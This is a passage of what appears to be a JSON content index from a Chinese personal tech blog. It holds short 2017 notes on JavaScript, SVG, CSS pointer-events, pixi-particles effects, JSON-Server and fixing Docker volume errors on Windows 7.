class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;</span><br><span class=\"line\">  foo() &#123;</span><br><span class=\"line\">    <span class=\"comment\">/* code */</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  bar() &#123;</span><br><span class=\"line\">    <span class=\"comment\">/* code */</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Method_definitions\" target=\"_blank\" rel=\"noopener\">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Method_definitions</a></p>\n","categories":["JavaScript"],"tags":["JavaScript","Method definitions"]},{"title":"用animsition製作閃動網站特效記錄","url":"/blog/2017/05/21/logdown/2017-05-21-1862646/","content":"<p>好久沒有分析網頁特效了<br>前篇都不知道過多少年了XD<br>最近有看到幾個07月新番網站還不錯來筆記一下</p>\n<a id=\"more\"></a>\n<p><img src=\"http://user-image.logdown.io/user/8284/blog/8171/post/1862646/7HrEqtSbTjWeJm3hdJR3_GIF.gif\" alt=\"GIF.gif\"><br><a href=\"http://colopl.co.jp/battlegirl-hs/anime/\" target=\"_blank\" rel=\"noopener\">http://colopl.co.jp/battlegirl-hs/anime/</a></p>\n<p>這個特效還不錯的，本來想看一下怎麼使用<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;div style=&quot;animation-duration: 800ms;&quot; class=&quot;animsition-overlay-slide overlay-slide-in-bottom&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure></p>\n<p>一找還發現有現程寫好的套件可以使用<br><a href=\"\">http://git.blivesta.com/animsition/</a></p>\n<p>官網還有很多套件<br><a href=\"http://www.blivesta.com/\" target=\"_blank\" rel=\"noopener\">http://www.blivesta.com/</a><br><a href=\"https://github.com/blivesta/\" target=\"_blank\" rel=\"noopener\">https://github.com/blivesta/</a></p>\n<script async src=\"//jsfiddle.net/1wfuoabL/4/embed/html,css,result/\"></script>\n\n<p>還滿簡單</p>\n","categories":["網頁特效"]},{"title":"SVG筆記紀錄(一)","url":"/blog/2017/05/29/logdown/2017-05-29-svg-notes/","content":"<p>最近覺得前端計術還滿重要的<br>趁著動畫課程還沒開始<br>把一些基本功學一學</p>\n<p>主要參考這篇教學<br>[SVG 完整教學 31 天 ](<a href=\"http://www.oxxostudio.tw/articles/201410/svg-tutorial.html\" target=\"_blank\" rel=\"noopener\">http://www.oxxostudio.tw/articles/201410/svg-tutorial.html</a></p>\n<a id=\"more\"></a>\n<p>目前看到Day4 SVG Path 基礎篇<br>在這篇簡單記錄看Day1~Day4筆記</p>\n<p>Day2 SVG Layer介紹，<code>一般在向量軟體都是最上層圖層在上面</code><br>但換在Code裡面，<code>SVG最下面才是最上層</code></p>\n<p>SVG 研究之路 (3) - 基本形狀</p>\n<p>矩形 <code>rect</code><br>圓角矩形 <code>rect rx ry</code><br>圓形<code>circle cx cy r</code><br>橢圓<code>ellipse cx cy rx ry</code><br>多邊形<code>polygon  points</code></p>\n<p>SVG 研究之路 (4) - Path 基礎篇<br>這篇感覺就還滿難的，貝茲曲線不知道麼畫<br>看懂在寫…</p>\n<pre><code>M = moveto\nL = lineto\nH = horizontal lineto\nV = vertical lineto\nC = curveto\nS = smooth curveto\nQ = quadratic Bézier curve\nT = smooth quadratic Bézier curveto\nA = elliptical Arc\nZ = closepath\n</code></pre><hr>\n<p>參考來源：<br>SVG <path><br><a href=\"https://www.w3schools.com/graphics/svg_path.asp\" target=\"_blank\" rel=\"noopener\">https://www.w3schools.com/graphics/svg_path.asp</a></path></p>\n<p>SVG 超硬派了解 line, polygon, polyline, path (手工繪製)<br><a href=\"https://wcc723.github.io/d3js/2014/10/02/Ironman-30-days-03/\" target=\"_blank\" rel=\"noopener\">https://wcc723.github.io/d3js/2014/10/02/Ironman-30-days-03/</a></p>\n<p>四個 SVG 動畫應用範例 － Firefox 十週年活動網站技術解密<br><a href=\"http://tech.mozilla.com.tw/posts/5660/%E5%9B%9B%E5%80%8B-svg-%E5%8B%95%E7%95%AB%E6%87%89%E7%94%A8%E7%AF%84%E4%BE%8B-%EF%BC%8D-firefox-%E5%8D%81%E9%80%B1%E5%B9%B4%E6%B4%BB%E5%8B%95%E7%B6%B2%E7%AB%99%E6%8A%80%E8%A1%93%E8%A7%A3%E5%AF%86\" target=\"_blank\" rel=\"noopener\">http://tech.mozilla.com.tw/posts/5660/%E5%9B%9B%E5%80%8B-svg-%E5%8B%95%E7%95%AB%E6%87%89%E7%94%A8%E7%AF%84%E4%BE%8B-%EF%BC%8D-firefox-%E5%8D%81%E9%80%B1%E5%B9%B4%E6%B4%BB%E5%8B%95%E7%B6%B2%E7%AB%99%E6%8A%80%E8%A1%93%E8%A7%A3%E5%AF%86</a></p>\n<p>cubic-bezier<br><a href=\"http://cubic-bezier.com/\" target=\"_blank\" rel=\"noopener\">http://cubic-bezier.com/</a></p>\n<p>練習畫向量圖<br><a href=\"http://bezier.method.ac/\" target=\"_blank\" rel=\"noopener\">http://bezier.method.ac/</a></p>\n","categories":["HTML"],"tags":["SVG"]},{"title":"在Win7安裝Docker(上)","url":"/blog/2017/06/01/logdown/2017-06-01-win7-installation-docker/","content":"<p>由於最近想跑一此程式，想玩Docker<br>可是工司遠端環境有用VMWare，這個又不能跟Docker 相容<br>想說用一台筆電用boot2docker玩玩看好了<br><a id=\"more\"></a></p>\n<blockquote>\n<p>Deprecated<br>This project (the boot2docker Windows Installer) is officially deprecated in favor of the new Docker Toolbox.</p>\n</blockquote>\n<p>經過爬文 Docker Toolbox 能在Windows 7上跑<br>原理是用Virtualbox跑VM</p>\n<p>就來安裝看看，結果桌面的Docker Quickstart Terminal打不開害我緊張一下。<br>Kitematic 還滿OK順利可以執行。</p>\n<p>步驟有看到這下面這個網站寫的很清楚了<br><a href=\"https://sites.google.com/a/fuanps.tp.edu.tw/d4s/4-jian-zhi/kitematic-alpha-for-windows\" target=\"_blank\" rel=\"noopener\">https://sites.google.com/a/fuanps.tp.edu.tw/d4s/4-jian-zhi/kitematic-alpha-for-windows</a></p>\n<p>想說一切都很順利，但沒想到裝<br><a href=\"https://github.com/bitnami/bitnami-docker-codeigniter\" target=\"_blank\" rel=\"noopener\">https://github.com/bitnami/bitnami-docker-codeigniter</a><br>發生幾個問題….留下篇寫</p>\n","categories":["Docker"]},{"title":"[CSS]看的到確摸不到的pointer-events屬性","url":"/blog/2017/05/22/logdown/2017-05-22-css-does-not-touch-the-pointer-events-property/","content":"<p>其實這篇是網站特效筆記<br>但還是分開兩個，方便以後參考</p>\n<a id=\"more\"></a>\n<p><img src=\"http://i.imgur.com/gSfaqHF.gif\" alt=\"\"><br><a href=\"http://www.tenshi-no-3p.com/\" target=\"_blank\" rel=\"noopener\">http://www.tenshi-no-3p.com/</a>網站看到下圖特效，往下飄的羽毛竟然放在前面<br>怎麼不會擋住下面的連結<br>經過仔細的探討<br>原來CSS有pointer-events好用的屬性<br>在此筆記:D<br><figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">pointer-events</span>: <span class=\"selector-tag\">none</span>;</span><br></pre></td></tr></table></figure></p>\n<p>就這麼簡單</p>\n<script async src=\"//jsfiddle.net/aucwaogL/embed/html,css,result/\"></script>\n\n<p>至於羽毛特效之後在分悉怎麼用的(pixi.js)<br><a href=\"http://blog.aquaring.co.jp/517\" target=\"_blank\" rel=\"noopener\">http://blog.aquaring.co.jp/517</a></p>\n<p>參考來源：<br>穿透的 div ( pointer-events )<br><a href=\"http://www.oxxostudio.tw/articles/201409/pointer-events.html\" target=\"_blank\" rel=\"noopener\">http://www.oxxostudio.tw/articles/201409/pointer-events.html</a></p>\n<p>pointer-events<br><a href=\"https://developer.mozilla.org/zh-TW/docs/Web/CSS/pointer-events?v=control\" target=\"_blank\" rel=\"noopener\">https://developer.mozilla.org/zh-TW/docs/Web/CSS/pointer-events?v=control</a></p>\n","categories":["CSS"],"tags":["CSS","pointer-events"]},{"title":"好用的前端測試工具JSON-Server","url":"/blog/2017/05/30/logdown/2017-05-30-1898666/","content":"<p>今天在Facebook看<a href=\"https://www.facebook.com/will.fans/videos/vb.119279178101235/1702264796469324/\" target=\"_blank\" rel=\"noopener\">保哥直播</a><br>介紹好用的JSON Server，要如何做好快速建立JSON Resful測試環境<br>簡單做一下筆記<br><a id=\"more\"></a><br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm install -g json-server</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">json-server  -w db.json</span><br></pre></td></tr></table></figure>\n<p>就可以完成一個簡單Web Server<br>但是這個並非安全的，預設有CORS</p>\n<p>並非只有存JSON查詢，有 新增/修改/刪除 功能</p>\n<p>最後他還介紹了，這還有router功能…<br>這真是強大的測試工具。</p>\n<iframe src=\"//www.slideshare.net/slideshow/embed_code/key/k8pFoqsYS0jNr\" width=\"595\" height=\"485\" frameborder=\"0\" marginwidth=\"0\" marginheight=\"0\" scrolling=\"no\" style=\"border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;\" allowfullscreen> </iframe> <div style=\"margin-bottom:5px\"> <strong> <a href=\"//www.slideshare.net/WillHuangTW/angular-2-advanced-topic-rxjs\" title=\"Angular 2 開發實戰：進階開發篇 - RxJS 新手入門\" target=\"_blank\">Angular 2 開發實戰：進階開發篇 - RxJS 新手入門</a> </strong> from <strong><a target=\"_blank\" href=\"https://www.slideshare.net/WillHuangTW\">Will Huang</a></strong> </div><br><br><br><iframe src=\"https://www.facebook.com/plugins/video.php?href=https%3A%2F%2Fwww.facebook.com%2Fwill.fans%2Fvideos%2F1702264796469324%2F&show_text=0&width=560\" width=\"560\" height=\"315\" style=\"border:none;overflow:hidden\" scrolling=\"no\" frameborder=\"0\" allowtransparency=\"true\" allowfullscreen=\"true\"></iframe>","categories":["實用工具"],"tags":["JSON-Server"]},{"title":"在Win7安裝Docker(下) - Window Volumes問題","url":"/blog/2017/06/02/logdown/2017-06-02-win7-installation-docker-part-two/","content":"<p>上篇Docker裝的還滿順利的，但RUN  <a href=\"https://github.com/bitnami/bitnami-docker-codeigniter\" target=\"_blank\" rel=\"noopener\">https://github.com/bitnami/bitnami-docker-codeigniter</a><br>就發生了問題<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ERROR: for s_myapp_1  Cannot create container for service myapp: invalid bind mo</span><br><span class=\"line\">unt spec &quot;C:\\\\Users\\\\computer\\\\Desktop\\\\s:/app:rw&quot;: invalid volume specification</span><br><span class=\"line\">: &apos;C:\\Users\\computer\\Desktop\\s:/app:rw&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">ERROR: for myapp  Cannot create container for service myapp: invalid bind mount</span><br><span class=\"line\">spec &quot;C:\\\\Users\\\\computer\\\\Desktop\\\\s:/app:rw&quot;: invalid volume specification: &apos;C</span><br><span class=\"line\">:\\Users\\computer\\Desktop\\s:/app:rw&apos;</span><br><span class=\"line\">ERROR: Encountered errors while bringing up the project.</span><br></pre></td></tr></table></figure></p>\n<a id=\"more\"></a>\n<p>網路爬文有找到幾個方法，但都沒什麼用<br><a href=\"http://qiita.com/ysti/items/aed9c766aed00fe731fc\" target=\"_blank\" rel=\"noopener\">http://qiita.com/ysti/items/aed9c766aed00fe731fc</a><br><a href=\"http://www.cnblogs.com/anliven/p/6481516.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/anliven/p/6481516.html</a><br><a href=\"https://xbug.lol/1341.html\" target=\"_blank\" rel=\"noopener\">https://xbug.lol/1341.html</a><br><a href=\"http://yanjunbiao.me/2016/01/03/Volume-Mount-Issue-of-Docker-on-Windows/\" target=\"_blank\" rel=\"noopener\">http://yanjunbiao.me/2016/01/03/Volume-Mount-Issue-of-Docker-on-Windows/</a></p>\n<p><code>/c/Users/</code>和’<code>//C/Users/</code>都還不行</p>\n<p>後來發現奇怪，怎麼MariaDB怎麼會有Volumes設定<br><figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">version:</span> <span class=\"string\">'2'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">services:</span></span><br><span class=\"line\"><span class=\"attr\">  mariadb:</span></span><br><span class=\"line\"><span class=\"attr\">    image:</span> <span class=\"string\">'bitnami/mariadb:latest'</span></span><br><span class=\"line\"><span class=\"attr\">    labels:</span></span><br><span class=\"line\">      <span class=\"string\">kompose.service.type:</span> <span class=\"string\">nodeport</span></span><br><span class=\"line\"><span class=\"attr\">    ports:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">'3306:3306'</span></span><br><span class=\"line\"><span class=\"attr\">    volumes:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">'mariadb_data:/bitnami/mariadb'</span></span><br><span class=\"line\"><span class=\"attr\">    environment:</span></span><br><span class=\"line\">      <span class=\"comment\"># ALLOW_EMPTY_PASSWORD is recommended only for development.</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">ALLOW_EMPTY_PASSWORD=yes</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">volumes:</span></span><br><span class=\"line\"><span class=\"attr\">  mariadb_data:</span></span><br><span class=\"line\"><span class=\"attr\">driver:</span> <span class=\"string\">local</span></span><br></pre></td></tr></table></figure></p>\n<p>喔喔，原來可以加volumes</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">version:</span> <span class=\"string\">'2'</span></span><br><span class=\"line\"><span class=\"attr\">services:</span></span><br><span class=\"line\"><span class=\"attr\">  myapp:</span></span><br><span class=\"line\"><span class=\"attr\">    image:</span> <span class=\"string\">'bitnami/codeigniter:latest'</span></span><br><span class=\"line\"><span class=\"attr\">    labels:</span></span><br><span class=\"line\">      <span class=\"string\">kompose.service.type:</span> <span class=\"string\">nodeport</span></span><br><span class=\"line\"><span class=\"attr\">    ports:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">'8000:8000'</span></span><br><span class=\"line\"><span class=\"attr\">    volumes:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">'myapp_data:/app'</span></span><br><span class=\"line\"><span class=\"attr\">    depends_on:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">mariadb</span></span><br><span class=\"line\"><span class=\"attr\">  mariadb:</span></span><br><span class=\"line\"><span class=\"attr\">    image:</span> <span class=\"string\">'bitnami/mariadb:latest'</span></span><br><span class=\"line\"><span class=\"attr\">    environment:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">ALLOW_EMPTY_PASSWORD=yes</span></span><br><span class=\"line\"><span class=\"attr\">volumes:</span></span><br><span class=\"line\"><span class=\"attr\">  myapp_data:</span></span><br><span class=\"line\"><span class=\"attr\">    driver:</span> <span class=\"string\">local</span></span><br></pre></td></tr></table></figure>\n<p>就正常了</p>\n<p>想說這樣應該能很順利，但…馬上就遇到Network問題<br>Docker port沒法轉到實體IP上面<br>我記得在VM跑ubuntu docker沒有這個問題<br>該不會又是Windows ….</p>\n<p>想說這個能解決<br><a href=\"https://blog.ephrain.net/virtualbox-%E4%BD%BF%E7%94%A8-port-forwarding-%E9%80%A3%E4%B8%8A-nat-%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84-vm/\" target=\"_blank\" rel=\"noopener\">https://blog.ephrain.net/virtualbox-%E4%BD%BF%E7%94%A8-port-forwarding-%E9%80%A3%E4%B8%8A-nat-%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84-vm/</a><br>遺憾還是不能….</p>\n","categories":["Docker"],"tags":["Volumes"]},{"title":"pixi-particles 羽毛特效分析筆記","url":"/blog/2017/06/04/logdown/2017-06-04-pixi-particles-feather-effect-analysis-notes/","content":"<p><img src=\"http://i.imgur.com/gSfaqHF.gif\" alt=\"\"><br>上篇記錄了<a href=\"http://malagege.logdown.com/posts/1864913-css-does-not-touch-the-pointer-events-property\" target=\"_blank\" rel=\"noopener\">[CSS]看的到確摸不到的pointer-events屬性</a><br>裡面還有很炫的旋轉嶼毛特效</p>\n<p>本來以為是計時器慢慢一秒做下去做旋轉<br>結果看code，竟然是pixijs特效做的<br><a id=\"more\"></a></p>\n<p><a href=\"http://blog.infographics.tw/2015/12/pixi-introduction/\" target=\"_blank\" rel=\"noopener\">突破 D3.js 的速度極限 — 2D WebGL 與 PIXI.js</a><br><a href=\"https://www.gitbook.com/book/supermrji/pixi-js/details\" target=\"_blank\" rel=\"noopener\">Pixi.js 中文教學</a></p>\n<p>簡單爬一下，PixiJS算是能幫你做出動畫用WebGL 加速<br>因此動畫會非常順暢(應該吧，我沒用過)</p>\n<p>旋轉是透過下面的套件來實作的<br><a href=\"https://github.com/pixijs/pixi-particles\" target=\"_blank\" rel=\"noopener\">pixijs/pixi-particles: A particle system for PixiJS</a><br>官網有一些範例</p>\n<p>雨毛旋轉範例是用snow特效<br>官方雨毛旋轉特效<br><figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"attr\">\"alpha\"</span>: &#123;</span><br><span class=\"line\">\t\t<span class=\"attr\">\"start\"</span>: <span class=\"number\">1</span>,</span><br><span class=\"line\">\t\t<span class=\"attr\">\"end\"</span>: <span class=\"number\">0.5</span></span><br><span class=\"line\">\t&#125;,</span><br><span class=\"line\">\t<span class=\"attr\">\"scale\"</span>: &#123;</span><br><span class=\"line\">\t\t<span class=\"attr\">\"start\"</span>: <span class=\"number\">1</span>,</span><br><span class=\"line\">\t\t<span class=\"attr\">\"end\"</span>: <span class=\"number\">0.7</span>,</span><br><span class=\"line\">\t\t<span class=\"attr\">\"minimumScaleMultiplier\"</span>: <span class=\"number\">0.5</span></span><br><span class=\"line\">\t&#125;,</span><br><span class=\"line\">\t<span class=\"attr\">\"color\"</span>: &#123;</span><br><span class=\"line\">\t\t<span class=\"attr\">\"start\"</span>: <span class=\"string\">\"#ffffff\"</span>,</span><br><span class=\"line\">\t\t<span class=\"attr\">\"end\"</span>: <span class=\"string\">\"#ffffff\"</span></span><br><span class=\"line\">\t&#125;,</span><br><span class=\"line\">\t<span class=\"attr\">\"speed\"</span>: &#123;</span><br><span class=\"line\">\t\t<span class=\"attr\">\"start\"</span>: <span class=\"number\">100</span>,</span><br><span class=\"line\">\t\t<span class=\"attr\">\"end\"</span>: <span class=\"number\">75</span></span><br><span class=\"line\">\t&#125;,</span><br><span class=\"line\">\t<span class=\"attr\">\"acceleration\"</span>: &#123;</span><br><span class=\"line\">\t\t<span class=\"attr\">\"x\"</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">\t\t<span class=\"attr\">\"y\"</span>: <span class=\"number\">0</span></span><br><span class=\"line\">\t&#125;,</span><br><span class=\"line\">\t<span class=\"attr\">\"startRotation\"</span>: &#123;</span><br><span class=\"line\">\t\t<span class=\"attr\">\"min\"</span>: <span class=\"number\">80</span>,</span><br><span class=\"line\">\t\t<span class=\"attr\">\"max\"</span>: <span class=\"number\">100</span></span><br><span class=\"line\">\t&#125;,</span><br><span class=\"line\">\t<span class=\"attr\">\"rotationSpeed\"</span>: &#123;</span><br><span class=\"line\">\t\t<span class=\"attr\">\"min\"</span>: <span class=\"number\">10</span>,</span><br><span class=\"line\">\t\t<span class=\"attr\">\"max\"</span>: <span class=\"number\">40</span></span><br><span class=\"line\">\t&#125;,</span><br><span class=\"line\">\t<span class=\"attr\">\"lifetime\"</span>: &#123;</span><br><span class=\"line\">\t\t<span class=\"attr\">\"min\"</span>: <span class=\"number\">10</span>,</span><br><span class=\"line\">\t\t<span class=\"attr\">\"max\"</span>: <span class=\"number\">10</span></span><br><span class=\"line\">\t&#125;,</span><br><span class=\"line\">\t<span class=\"attr\">\"blendMode\"</span>: <span class=\"string\">\"normal\"</span>,</span><br><span class=\"line\">\t<span class=\"attr\">\"ease\"</span>: [</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"attr\">\"s\"</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">\t\t\t<span class=\"attr\">\"cp\"</span>: <span class=\"number\">0.379</span>,</span><br><span class=\"line\">\t\t\t<span class=\"attr\">\"e\"</span>: <span class=\"number\">0.548</span></span><br><span class=\"line\">\t\t&#125;,</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"attr\">\"s\"</span>: <span class=\"number\">0.548</span>,</span><br><span class=\"line\">\t\t\t<span class=\"attr\">\"cp\"</span>: <span class=\"number\">0.717</span>,</span><br><span class=\"line\">\t\t\t<span class=\"attr\">\"e\"</span>: <span class=\"number\">0.676</span></span><br><span class=\"line\">\t\t&#125;,</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"attr\">\"s\"</span>: <span class=\"number\">0.676</span>,</span><br><span class=\"line\">\t\t\t<span class=\"attr\">\"cp\"</span>: <span class=\"number\">0.635</span>,</span><br><span class=\"line\">\t\t\t<span class=\"attr\">\"e\"</span>: <span class=\"number\">1</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t],</span><br><span class=\"line\">\t<span class=\"attr\">\"frequency\"</span>: <span class=\"number\">0.5</span>,</span><br><span class=\"line\">\t<span class=\"attr\">\"emitterLifetime\"</span>: <span class=\"number\">-1</span>,</span><br><span class=\"line\">\t<span class=\"attr\">\"maxParticles\"</span>: <span class=\"number\">140</span>,</span><br><span class=\"line\">\t<span class=\"attr\">\"pos\"</span>: &#123;</span><br><span class=\"line\">\t\t<span class=\"attr\">\"x\"</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">\t\t<span class=\"attr\">\"y\"</span>: <span class=\"number\">0</span></span><br><span class=\"line\">\t&#125;,</span><br><span class=\"line\">\t<span class=\"attr\">\"addAtBack\"</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\">\t<span class=\"attr\">\"spawnType\"</span>: <span class=\"string\">\"rect\"</span>,</span><br><span class=\"line\">\t<span class=\"attr\">\"spawnRect\"</span>: &#123;</span><br><span class=\"line\">\t\t<span class=\"attr\">\"x\"</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">\t\t<span class=\"attr\">\"y\"</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">\t\t<span class=\"attr\">\"w\"</span>: <span class=\"number\">900</span>,</span><br><span class=\"line\">\t\t<span class=\"attr\">\"h\"</span>: <span class=\"number\">100</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>可把上方內容載入到<a href=\"http://pixijs.github.io/pixi-particles-editor/\" target=\"_blank\" rel=\"noopener\">PixiParticlesEditor</a><br>在把雨毛傳到上面，這樣就可以在PixiParticlesEditor看到特效</p>\n<p>pixi-particles上面還有很多特效值的玩一玩<br>好像還能運用在RPG Maker上面<br><a href=\"http://rm.66rpg.com/thread-386105-1-1.html\" target=\"_blank\" rel=\"noopener\">PixiParticlesEditor　pixi.js特效 - RPG Maker MV 讨论区 - 66RPG - Powered by Discuz!</a><br>參考來源：<br><a href=\"http://blog.aquaring.co.jp/517\" target=\"_blank\" rel=\"noopener\">pixi.jsを勉強する[2] -PIXI Particles- - [ALL]| アクアリングBLOG</a><br><a href=\"http://pixijs.github.io/pixi-particles-editor/\" target=\"_blank\" rel=\"noopener\">PixiParticlesEditor</a></p>\n","categories":["pixi"]},{"title":"JavaScript ,逗號運算符號","url":"/blog/2017/06/16/logdown/2017-06-16-1954776/","content":"<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">e</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!e.ctrlKey &amp;&amp; !e.shiftKey &amp;&amp; !e.altKey) &#123;</span><br><span class=\"line\">    $(<span class=\"string\">\".site\"</span>).addClass(<span class=\"string\">\"fade-out\"</span>), $(<span class=\"string\">\".mfp-close\"</span>).trigger(<span class=\"string\">\"click\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">var</span> t = $(<span class=\"keyword\">this</span>).attr(<span class=\"string\">\"href\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> setTimeout(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      location.href = t</span><br><span class=\"line\">    &#125;, <span class=\"number\">600</span>), !<span class=\"number\">1</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>最近看到這段程式很好奇為什麼return 回去後面要加,變數<br>沒想到能這樣用<br>記錄一下</p>\n<p>參考來源：<br> <a href=\"https://developer.mozilla.org/zh-TW/docs/Web/JavaScript/Reference/Operators/Comma_Operator\" target=\"_blank\" rel=\"noopener\">https://developer.mozilla.org/zh-TW/docs/Web/JavaScript/Reference/Operators/Comma_Operator</a></p>\n<p>JS逗号运算符的用法详解(转) - pinocchioatbeijing - 博客园<br><a href=\"http://www.cnblogs.com/pinocchioatbeijing/articles/2343736.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/pinocchioatbeijing/articles/2343736.html</a></p>\n<p>JavaScript 的逗號操作符<br><a href=\"http://www.jstips.co/zh_tw/javascript/comma-operaton-in-js/\" target=\"_blank\" rel=\"noopener\">http://www.jstips.co/zh_tw/javascript/comma-operaton-in-js/</a></p>\n","categories":["JavaScript"],"tags":["JavaScript"]},{"title":"點超連結頁面動畫特效","url":"/blog/2017/06/13/logdown/2017-06-13-1948791/","content":"<p>最近還有個東西沒記錄<br>點連結動畫特效<br>覺得還不錯，就小小研究<br>照下面網站參照做個小小範例<br><a href=\"http://nora-anime.net/\" target=\"_blank\" rel=\"noopener\">http://nora-anime.net/</a></p>\n<a id=\"more\"></a>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"header-menu\"</span>&gt;</span>1<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"header-menu\"</span>&gt;</span>2<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"header-menu\"</span>&gt;</span>3<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"header-menu\"</span>&gt;</span>4<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"header-menu\"</span>&gt;</span>5<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"header-menu\"</span>&gt;</span>6<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"header-menu\"</span>&gt;</span>7<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"header-menu\"</span>&gt;</span>8<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"header-menu\"</span>&gt;</span>9<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"header-menu\"</span>&gt;</span>10<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"button\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"btn\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"toggle\"</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\">@<span class=\"keyword\">keyframes</span> menu-in-s &#123;</span><br><span class=\"line\">    0% &#123;</span><br><span class=\"line\">        <span class=\"attribute\">opacity</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"attribute\">-webkit-transform</span>: <span class=\"built_in\">translateY</span>(40px);</span><br><span class=\"line\">        <span class=\"attribute\">transform</span>: <span class=\"built_in\">translateY</span>(40px);</span><br><span class=\"line\">        <span class=\"attribute\">-webkit-animation-timing-function</span>: ease-out;</span><br><span class=\"line\">        <span class=\"attribute\">animation-timing-function</span>: ease-out</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    80% &#123;</span><br><span class=\"line\">        <span class=\"attribute\">opacity</span>: <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"attribute\">-webkit-transform</span>: <span 